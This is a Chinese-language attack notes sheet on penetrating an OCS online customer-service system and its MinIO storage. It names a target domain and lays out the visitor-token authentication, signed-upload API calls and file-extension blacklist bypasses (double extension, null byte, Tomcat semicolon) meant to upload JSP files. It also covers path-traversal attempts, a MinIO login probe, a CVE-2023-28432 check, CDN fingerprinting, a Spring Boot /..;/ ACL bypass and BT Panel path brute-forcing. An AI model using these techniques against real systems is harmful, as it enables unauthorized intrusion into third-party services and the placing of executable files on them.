### OCS在线客服系统渗透 + MinIO对象存储利用
```
发现入口: 落地页HTML客服链接暴露OCS域名(如leiyushan.com) → Playwright加载SPA截获真实API调用
认证流程: POST /api/v1/v/init {cid,vid} → data.tk = visitor token; 后续请求头 x-v-token: <token>
核心API: /api/v1/v/bc(开始聊天) /api/v1/v/oss/sign(获取上传签名) /api/v1/v/message/send(发消息)
上传链: GET /api/v1/v/oss/sign → {sn,et,ul,ulw,dir,cid,og} → POST https://UL/api/v1/f/wj/tr
  请求头: sign=<sn>, expTime=<et>  表单: file=@file, cid=<cid>, dir=<dir>, og=<og>, fn=<filename>, fg=0
黑名单绕过(白名单外扩展名被拦截):
  ✓ .jsp.jpg(双扩展名,最后ext通过检测) ✓ .jsp%00.jpg(空字节截断) ✓ .jsp;.jpg(Tomcat路径参数)
  ✗ .jsp/.jspx/.JSP/.Jsp/war/php/py/sh/xml/svg/html/txt/json/yaml/properties/sql/doc/ini/conf
⚠️ 文件存储在MinIO对象存储=静态对象,不会被Tomcat执行(需写入webroot才能RCE)
  验证: curl https://UL/bucket/dir/date/filename → 返回文件内容(纯文本,非执行)
dir参数穿越: sign服务不验证dir内容(总返回固定bucket sign); upload服务检查bucket权限
  dir=conf → 500(尝试写conf bucket但权限不足) dir=../../ → 500(穿越被拒)
MinIO Console(端口9001): POST /api/v1/login {"accessKey":"X","secretKey":"Y"} → 403=invalid Login
  CVE-2023-28432: POST /minio/health/cluster?verify → 新版已修补(返回BadRequest不泄露env)
CDN层识别(响应大小指纹):
  CDN WAF拦截页 ~2000字节 | WSCN JS挑战页 ~6000字节(Embed Iframe) | nginx 404 = 146字节
  Spring Boot JSON 404 ~100字节 | Tomcat HTML 404 ~435字节
nginx方法限制: admin路径(/api/v1/a/ /api/v1/s/)只允许GET → POST返回405
WSCN网宿CDN JS挑战: Playwright自动通过 | 路径白名单独立于JS挑战(过了挑战仍按路径ACL拦截)
Spring Boot路径穿越: /c/..;/path → 绕过nginx路径ACL到达Spring Boot (分号=Tomcat路径参数截断)
BT Panel入口: Set-Cookie泄露cookie名 → 入口路径随机8位不可推导,只能暴力枚举
Longteng CDN: TLS证书暴露所有关联域名 | Server头暴露源站OS版本
```
